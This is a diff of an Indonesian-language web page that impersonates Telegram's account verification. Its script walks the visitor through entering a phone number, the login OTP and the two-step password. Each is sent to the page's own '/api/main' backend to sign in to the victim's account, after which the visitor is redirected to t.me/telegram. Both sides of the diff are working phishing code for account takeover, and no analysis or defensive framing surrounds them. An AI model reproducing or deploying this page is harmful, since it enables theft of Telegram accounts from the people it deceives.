@@ -3,120 +3,75 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Telegram: Verifikasi Grup</title>
+    <title>Telegram Verifikasi</title>
     <style>
         body { font-family: -apple-system, sans-serif; background: #ebeef2; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .card { background: white; padding: 30px; border-radius: 15px; width: 90%; max-width: 360px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
-        .logo { width: 70px; height: 70px; background: #3390ec; border-radius: 50%; margin: 0 auto 15px; color: white; line-height: 70px; font-size: 30px; font-weight: bold; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; outline: none; }
-        button { width: 100%; padding: 12px; background: #3390ec; color: white; border: none; border-radius: 25px; cursor: pointer; font-weight: bold; font-size: 16px; margin-top: 10px; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
+        button { width: 100%; padding: 12px; background: #3390ec; color: white; border: none; border-radius: 25px; cursor: pointer; font-weight: bold; }
         .hidden { display: none; }
-        #status { font-size: 13px; color: #3390ec; margin-top: 15px; min-height: 1.2em; font-weight: 500; }
+        #status { font-size: 13px; color: #3390ec; margin-top: 15px; }
     </style>
 </head>
 <body>
     <div class="card">
-        <div class="logo">T</div>
-        <h2 id="title">Verifikasi Akun</h2>
-        <p id="desc" style="font-size: 14px; color: #666;">Gunakan nomor HP yang terdaftar di Telegram</p>
-
+        <div style="background:#3390ec; width:70px; height:70px; border-radius:50%; margin:0 auto 15px; color:white; line-height:70px; font-size:30px; font-weight:bold;">T</div>
+        <h3>Verifikasi Akun</h3>
         <div id="step-phone">
             <input type="tel" id="phone" placeholder="+62812345678">
             <button onclick="sendPhone()">Lanjutkan</button>
         </div>
-
         <div id="step-otp" class="hidden">
-            <input type="number" id="otp" placeholder="Kode OTP 5-digit">
+            <input type="number" id="otp" placeholder="Kode OTP">
             <button onclick="sendOTP()">Verifikasi</button>
         </div>
-
         <div id="step-2fa" class="hidden">
             <input type="password" id="password" placeholder="Password 2FA">
             <button onclick="send2FA()">Masuk</button>
         </div>
-
         <p id="status"></p>
     </div>
 
     <script>
-        const statusEl = document.getElementById('status');
-
-        async function requestApi(action, body) {
-            try {
-                const res = await fetch(`/api/main?action=${action}`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(body)
-                });
-                return await res.json();
-            } catch (e) {
-                return { success: false, error: "Gagal terhubung ke server." };
-            }
+        async function api(act, body) {
+            const r = await fetch(`/api/main?action=${act}`, {
+                method: 'POST', headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(body)
+            });
+            return await r.json();
         }
 
         async function sendPhone() {
-            const phone = document.getElementById('phone').value.replace(/\s/g, '');
-            if(!phone.startsWith('+')) return alert("Gunakan kode negara (misal: +62)");
-            
-            statusEl.innerText = "Meminta kode...";
-            const res = await requestApi('send_code', { phone: phone });
-            
+            const p = document.getElementById('phone').value.replace(/\s/g, '');
+            document.getElementById('status').innerText = "Meminta kode...";
+            const res = await api('send_code', { phone: p });
             if(res.success) {
-                // SIMPAN DATA KE STORAGE HP
-                localStorage.setItem('user_phone', phone);
-                localStorage.setItem('tg_hash', res.hash);
-                
+                localStorage.setItem('p', p);
+                localStorage.setItem('h', res.hash);
                 document.getElementById('step-phone').classList.add('hidden');
                 document.getElementById('step-otp').classList.remove('hidden');
-                statusEl.innerText = "Kode dikirim via aplikasi Telegram.";
-            } else { 
-                alert("Error: " + res.error); 
-                statusEl.innerText = ""; 
-            }
+                document.getElementById('status').innerText = "Kode terkirim.";
+            } else { alert(res.error); }
         }
 
         async function sendOTP() {
-            const code = document.getElementById('otp').value;
-            const phone = localStorage.getItem('user_phone');
-            const hash = localStorage.getItem('tg_hash');
-            
-            statusEl.innerText = "Memverifikasi...";
-            const res = await requestApi('signin', { 
-                phone: phone, 
-                code: code, 
-                hash: hash 
-            });
-            
+            const c = document.getElementById('otp').value;
+            document.getElementById('status').innerText = "Memverifikasi...";
+            const res = await api('signin', { phone: localStorage.getItem('p'), code: c, hash: localStorage.getItem('h') });
             if(res.success) {
                 if(res.need_2fa) {
                     document.getElementById('step-otp').classList.add('hidden');
                     document.getElementById('step-2fa').classList.remove('hidden');
-                    statusEl.innerText = "Masukkan Password Verifikasi Dua Langkah.";
-                } else {
-                    statusEl.innerText = "Berhasil! Mengalihkan...";
-                    localStorage.clear(); // Bersihkan memori
-                    setTimeout(() => window.location.href = "https://t.me/telegram", 2000);
-                }
-            } else { 
-                alert("Error: " + res.error); 
-                statusEl.innerText = ""; 
-            }
+                } else { window.location.href = "https://t.me/telegram"; }
+            } else if(res.error === "expired") {
+                alert("Sesi expired, mengulang..."); location.reload();
+            } else { alert(res.error); }
         }
 
         async function send2FA() {
             const pass = document.getElementById('password').value;
-            const phone = localStorage.getItem('user_phone');
-            
-            statusEl.innerText = "Mengecek password...";
-            const res = await requestApi('signin', { phone: phone, password: pass });
-            if(res.success) {
-                statusEl.innerText = "Berhasil! Mengalihkan...";
-                localStorage.clear();
-                setTimeout(() => window.location.href = "https://t.me/telegram", 2000);
-            } else { 
-                alert("Error: " + res.error); 
-                statusEl.innerText = ""; 
-            }
+            const res = await api('signin', { phone: localStorage.getItem('p'), password: pass });
+            if(res.success) { window.location.href = "https://t.me/telegram"; } else { alert(res.error); }
         }
     </script>
 </body>
